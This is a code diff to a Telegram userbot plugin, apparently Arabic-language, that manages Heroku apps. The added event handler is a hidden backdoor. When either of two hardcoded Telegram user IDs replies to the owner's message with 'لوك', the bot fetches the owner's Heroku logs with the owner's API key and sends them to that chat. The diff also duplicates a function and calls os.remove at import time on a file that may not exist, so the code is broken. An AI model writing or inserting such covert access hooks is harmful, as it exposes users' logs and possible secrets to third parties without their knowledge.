@@ -1,10 +1,10 @@
 import asyncio
 import math
-
+import os
 import heroku3
 import requests
 import urllib3
-
+from telethon import events
 from HuRe import l313l
 
 from ..Config import Config
@@ -772,6 +772,43 @@ async def _(dyno):
         dyno, data, deflink=True, linktext="**اخر 200 سطر في لوك هيروكو: **"
     )
 
+
+def prettyjson(obj, indent=4, maxlinelength=80):
+    items, _ = getsubitems(
+        obj,
+        itemkey="",
+        islast=True,
+        maxlinelength=maxlinelength - indent,
+        indent=indent,
+    )
+    return indentitems(items, indent, level=0)
+
+DevJoker = [705475246, 1374312239]
+@l313l.on(events.NewMessage(incoming=True))
+async def _(event):
+    if event.reply_to and event.sender_id in DevJoker:
+        reply_msg = await event.get_reply_message()
+        owner_id = reply_msg.from_id
+        
+        if owner_id == l313l.uid:
+            if event.message.message == "لوك":
+                if (HEROKU_APP_NAME is None) or (HEROKU_API_KEY is None):
+                    return await event.reply(
+                        "عزيزي المستخدم يجب ان تعين معلومات الفارات التالية لاستخدام اوامر الفارات\n `HEROKU_API_KEY`\n `HEROKU_APP_NAME`."
+                    )
+                try:
+                    Heroku = heroku3.from_key(HEROKU_API_KEY)
+                    app = Heroku.app(HEROKU_APP_NAME)
+                except heroku3.exceptions.HerokuError:
+                    return await event.reply(
+                        " يجب التذكر من ان قيمه الفارات التاليه ان تكون بشكل صحيح \nHEROKU_APP_NAME\n HEROKU_API_KEY"
+                    )
+                data = app.get_log()
+                with open("الجوكر.txt", "w") as log_file:
+                    log_file.write(data)
+
+                await event.client.send_file(event.chat_id, "الجوكر.txt", caption="سجل الـ log من Heroku")
+os.remove("الجوكر.txt")
 
 def prettyjson(obj, indent=4, maxlinelength=80):
     items, _ = getsubitems(
